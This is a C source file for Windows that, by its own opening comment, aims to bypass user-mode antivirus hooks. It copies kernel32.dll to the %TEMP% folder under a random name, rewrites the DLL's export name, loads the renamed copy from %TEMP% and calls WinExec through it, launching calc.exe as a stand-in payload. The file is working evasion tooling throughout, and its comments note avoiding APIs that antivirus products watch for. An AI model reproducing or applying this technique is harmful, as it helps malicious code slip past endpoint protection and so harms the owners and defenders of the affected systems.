//	The goal of this project is to bypass ring 3 AV hooks
//	What it does is that it copies the specified API to the %TEMP% folder and rename the exported name

#include <Windows.h>
#include <time.h>
#include <Shlwapi.h>
#include <stdio.h>

typedef UINT(WINAPI* PWinExec)(LPCSTR, UINT);

INT GenerateRandomInt(INT min, INT max)
{
	srand(time(NULL));
	return (rand() % (max - (min+1))) + min;
}

CHAR* GenerateRandomFileName(INT nFileNameLength)
{
	srand(time(NULL));
	nFileNameLength -= 4;	//".dll"
	LPCSTR cszFileExt = ".dll";
	CHAR alphanumerical[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	INT nBufferSize = nFileNameLength + strlen(cszFileExt) + 1;
	CHAR* szFileName = (PCHAR)malloc(nBufferSize);

	if (NULL == szFileName)
		return NULL;
	else
		//If I didn't made this else, VS would continue bothering me saying that szFileName can be equal to 0
	{
		for (INT i = 0; i < nFileNameLength; i++)
		{
			szFileName[i] = alphanumerical[rand() % (sizeof(alphanumerical) - 1)];
		}
		szFileName[nFileNameLength] = '\0';

		if (strcat_s(szFileName, nBufferSize, cszFileExt))
		{
			printf("Failed strcat_s(%s, %s)\n", szFileName, cszFileExt);
			return NULL;
		}
	}

	return szFileName;
}

BOOL RenameExportedName(CHAR* szApiPath)	// this function name might sound redundant
{
	// I didn't use CreateFileMapping and MapViewOfFile because I think they are easily by AVs since they are commonly used in malwares

	FILE* hFile = NULL;
	fopen_s(&hFile, szApiPath, "r+b");
	if (NULL == hFile)
		return FALSE;

	IMAGE_DOS_HEADER DosHeader;
	fread_s(&DosHeader, sizeof(DosHeader), 1, sizeof(DosHeader), hFile);

	fseek(hFile, DosHeader.e_lfanew, SEEK_SET);
	IMAGE_NT_HEADERS NtHeaders;
	fread_s(&NtHeaders, sizeof(NtHeaders), 1, sizeof(NtHeaders), hFile);

	if (16 != NtHeaders.OptionalHeader.NumberOfRvaAndSizes)
		return FALSE;

	fseek(hFile, DosHeader.e_lfanew + sizeof(NtHeaders), SEEK_SET);
	IMAGE_SECTION_HEADER CurrentSectionHeader;
	fread_s(&CurrentSectionHeader, sizeof(CurrentSectionHeader), 1, sizeof(CurrentSectionHeader), hFile);

	IMAGE_SECTION_HEADER PreviousSectionHeader;
	SecureZeroMemory(&PreviousSectionHeader, sizeof(PreviousSectionHeader));

	UINT i = 0;
	while ((i++ < NtHeaders.FileHeader.NumberOfSections) && (CurrentSectionHeader.VirtualAddress < NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress))
	{
		PreviousSectionHeader = CurrentSectionHeader;
		fread_s(&CurrentSectionHeader, sizeof(CurrentSectionHeader), 1, sizeof(CurrentSectionHeader), hFile);
	}

	ULONG ulExportTableOffsetInSection = NtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress - PreviousSectionHeader.VirtualAddress;
	ULONG ulExportTableOffsetInFile = PreviousSectionHeader.PointerToRawData + ulExportTableOffsetInSection;

	fseek(hFile, ulExportTableOffsetInFile, SEEK_SET);
	IMAGE_EXPORT_DIRECTORY ExportDirectory;
	fread_s(&ExportDirectory, sizeof(ExportDirectory), 1, sizeof(ExportDirectory), hFile);


	ULONG ulExportNameOffsetInFile = PreviousSectionHeader.PointerToRawData + (ExportDirectory.Name - PreviousSectionHeader.VirtualAddress);

	fseek(hFile, ulExportNameOffsetInFile, SEEK_SET);
	CHAR szExportName[MAX_PATH + 1];
	fread_s(szExportName, MAX_PATH + 1, 1, MAX_PATH, hFile);
	CHAR* szNewExportName = GenerateRandomFileName(strlen(szExportName));
	fseek(hFile, ulExportNameOffsetInFile, SEEK_SET);
	fputs(szNewExportName, hFile);

	fclose(hFile);
	
	return TRUE;
}

CHAR* CloneAPI(CHAR* szApiName)
{
	CHAR szTempFolder[MAX_PATH+1];
	//Get the %TEMP% folder
	if (NULL == GetTempPath(MAX_PATH + 1, szTempFolder))
	{
		printf("Failed getting temp path\n");
		return NULL;
	}

	const UINT WCHARBUF_LEN = MAX_PATH * 3;
	WCHAR wszTempFolder[WCHARBUF_LEN];
	//Maps the path of %TEMP% which is a character string to a UTF-16 string
	if (NULL == MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, szTempFolder, -1, wszTempFolder, WCHARBUF_LEN))
	{
		printf("Failed convert %s to PWCHAR\n", szTempFolder);
		return NULL;
	}

	//Adds the %TEMP% folder as a DLL directory
	if (NULL == SetDllDirectoryW(wszTempFolder))	// Only works on Windows 8+ or KB2533623 on Windows 7
	{
		printf("Failed adding %s as a DLL directory\n", szTempFolder);
		return NULL;
	}
	
	CHAR szFullApiPath[MAX_PATH + 1];
	StrCpyA(szFullApiPath, szApiName);
	//Resolve the full path of the provided API
	if (FALSE == PathFindOnPath(szFullApiPath, NULL))
	{
		printf("Failed getting full path for %s\n", szApiName);
		return NULL;
	}

	CHAR* szNewApiPath = szTempFolder;
	CHAR* szNewApiFilename = GenerateRandomFileName(GenerateRandomInt(8, 18));
	//Concats %TEMP%/ with the name of the API
	if (strcat_s(szNewApiPath, MAX_PATH + 1, (LPCSTR)szNewApiFilename))
	{
		printf("Failed strcat_s(%s, %s)\n", szNewApiPath, szNewApiFilename);
		return NULL;
	}

	//Copies the existing API into the %TEMP% folder
	if (NULL == CopyFile(szFullApiPath, szNewApiPath, FALSE))
	{
		printf("Failed to copy %s to %s\n", szFullApiPath, szNewApiPath);
		return NULL;
	}

	//Renames the exported name of the API
	if (FALSE == RenameExportedName(szNewApiPath))
	{
		printf("Failed to modify exported name in %s\n", szNewApiPath);
		return NULL;
	}
	printf("%s\n", szNewApiPath);

	return szNewApiFilename;
}

INT main()
{
	CHAR* newApi = CloneAPI((PCHAR)"kernel32.dll");
	HMODULE hLib = LoadLibrary(newApi);
	if (NULL == hLib)
		return -1;

	PVOID pFunc = GetProcAddress(hLib, "WinExec");
	if (NULL == pFunc)
		return -2;

	((PWinExec)pFunc)("calc.exe", SW_SHOW);
	return 0;
}
